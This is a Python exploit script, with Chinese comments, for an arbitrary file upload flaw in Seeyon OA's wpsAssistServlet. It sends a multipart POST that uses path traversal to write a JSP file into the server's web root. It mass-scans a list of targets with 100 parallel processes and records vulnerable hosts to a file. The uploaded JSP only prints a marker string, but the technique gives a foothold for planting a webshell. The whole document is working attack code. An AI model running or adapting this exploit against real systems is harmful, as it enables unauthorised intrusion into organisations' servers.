import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

# 定义横幅
def banner():
    banner = '''
███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗ █████╗ ███╗   ██╗ ██████╗  █████╗ ██╗    ██╗██████╗ ███████╗
╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║██╔══██╗████╗  ██║██╔═══██╗██╔══██╗██║    ██║██╔══██╗██╔════╝
  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║███████║██╔██╗ ██║██║   ██║███████║██║ █╗ ██║██████╔╝███████╗
 ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║██╔══██║██║╚██╗██║██║   ██║██╔══██║██║███╗██║██╔═══╝ ╚════██║
███████╗██║  ██║██║   ██║   ╚██████╔╝██║  ██║██║ ╚████║╚██████╔╝██║  ██║╚███╔███╔╝██║     ███████║
╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝     ╚══════╝
                                                        version:致远OA A6、A8、A8N (V8.0SP2,V8.1,V8.1SP1)
                                                                致远OA G6、G6N (V8.1、V8.1SP1)              
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="致远OA wpsAssistServlet 任意文件上传漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
# 构造poc
def poc(target):
    payload = '/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/test.jsp&fileId=2'
    url = target+payload
    header = {
        "Content-Length": "216",
        "Content-Type": "multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b",
        "Accept-Encoding": "gzip",

    }
    data = (
        "--59229605f98b8cf290a7b8908b34616b\r\n"
        'Content-Disposition: form-data; name="upload"; filename="test.txt"\r\n'
        'Content-Type: application/vnd.ms-excel\r\n'
        "\r\n"
        '<% out.println("seeyon_vuln");%>\r\n'
        "--59229605f98b8cf290a7b8908b34616b--\r\n"
    )
   
    proxy = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }
    result = target +'/test.jsp'
    try:
        res = requests.get(url=target,verify=False,timeout=10)
        if res.status_code == 200:
            res1 = requests.post(url=url,headers=header,data=data,verify=False,timeout=10,proxies=proxy)
            if  res1.status_code == 200 and 'true' in res1.text:
                print(f"[+]此url{target}存在漏洞,上传后的url为:{result}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+'\n') 
            else:
                print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()
